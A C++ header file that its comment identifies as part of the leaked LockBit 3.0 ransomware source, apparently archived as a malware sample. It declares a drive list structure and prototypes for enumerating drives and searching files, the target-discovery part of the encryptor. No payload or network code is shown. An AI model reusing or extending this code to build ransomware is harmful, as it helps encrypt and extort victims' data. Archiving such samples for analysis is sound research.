/*
  name      LockBit 3.0 (Black)
  type      ransomware
  cve       —
  year      2022
  os        windows
  authors   LockBit Group
  source    https://github.com/Zzutiky666/LockBit (leaked source)
  archived  krisyotam
  notes     leaked by disgruntled affiliate Sept 2022; most prolific RaaS 2022-2024
 */

#pragma once
#include "common.h"
#include "queue.h"
#include "memory.h"

namespace filesystem {

	typedef struct drive_info_ {

		std::wstring RootPath;
		TAILQ_ENTRY(drive_info_) Entries;

	} DRIVE_INFO, *PDRIVE_INFO;

	typedef TAILQ_HEAD(drive_list_, drive_info_) DRIVE_LIST, * PDRIVE_LIST;

	INT EnumirateDrives(PDRIVE_LIST DriveList);
	VOID SearchFiles(std::wstring StartDirectory, INT ThreadPoolID);
	DWORD WINAPI StartLocalSearch(PVOID pArg);

}